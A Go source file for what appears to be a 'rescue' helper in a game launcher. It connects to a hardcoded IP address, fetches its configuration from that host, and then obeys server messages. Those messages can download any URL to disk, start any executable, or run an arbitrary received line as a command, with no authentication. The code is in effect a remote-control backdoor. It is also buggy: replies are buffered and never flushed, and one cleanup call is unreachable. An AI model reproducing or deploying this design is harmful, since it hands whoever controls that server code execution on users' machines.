package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
)

func initRescue() {
	//获取server地址
	if !Exists("rescueip") {
		WriteFile("rescueip", "39.100.5.139")
	}
	ip, _ := ReadFile("rescueip")
	//连接
mkConn:
	for {
		fmt.Println("try to connect:" + ip)
		tcpAddr, _ := net.ResolveTCPAddr("tcp", ip+":1032")
		conn, err := net.DialTCP("tcp", nil, tcpAddr)
		if err != nil {
			continue mkConn
		}
		defer conn.Close()
		fmt.Println("rescue connected")
		handleConn(conn)
	}
	wg.Done()
}

var writer *bufio.Writer

func handleConn(conn net.Conn) {
	reader := bufio.NewReader(conn)
	writer = bufio.NewWriter(conn)
	//读取name
	if !Exists("ghostjc.ini") {
		err := DownloadFile("http://39.100.5.139/ghost/client/ghostjc.ini", "ghostjc.ini")
		if err != nil {
			WriteFile("ghostjc.ini", "port=1033\nip=39.100.5.139\nname=test\n")
		}
	}
	var cfg config
	err := cfg.Load("ghostjc.ini")
	if err != nil {
		fmt.Println("无法读取配置文件", err.Error())
	}
	//writer:=bufio.NewWriter(conn)
	//发送name数据
	name, _ := cfg.Get("name")
	fmt.Println("name:" + name)
	conn.Write([]byte("info n" + name + "\n"))
	fmt.Println("name sent")
	//循环接收信息
readMsg:
	for {
		msg, _, err := reader.ReadLine()
		fmt.Println("ReadString")
		fmt.Println(string(msg))

		if err != nil || err == io.EOF {
			fmt.Println(err)
			break
		}
		spt := strings.Split(string(msg), " ")
		switch spt[0] {
		case "launch":
			err = launchClient()
			if err != nil {
				WriteToServer(err.Error())
			}
			continue readMsg
		case "check":
			if len(spt) < 2 {
				WriteToServer("\"check jre\" or \"check client\"?")
				continue readMsg
			}
			switch spt[1] {
			case "jre":
				checkJRE()
				WriteToServer("check jre")
				continue readMsg
			case "client":
				checkClient()
				WriteToServer("check client")
				continue readMsg
			default:
				WriteToServer("\"check jre\" or \"check client\"?")
				continue readMsg
			}
		case "download":
			if len(spt) < 3 {
				WriteToServer("download <url> <target>")
				continue readMsg
			}
			err := DownloadFile(spt[1], spt[2])
			if err != nil {
				WriteToServer(err.Error())
				continue readMsg
			}
			WriteToServer("success")
			continue readMsg
		case "run":
			if len(spt) < 2 {
				WriteToServer("run <execFile>")
				continue readMsg
			}
			c := exec.Command(spt[1])
			if err := c.Start(); err != nil {
				WriteToServer(err.Error())
			}
			continue readMsg
		}
		//没有任何操作
		c := exec.Command(string(msg))
		err = c.Start()
		if err != nil {
			WriteToServer(err.Error())
		}
	}
}
func WriteToServer(msg string) (int, error) {
	return writer.Write([]byte(msg + "\n"))
}
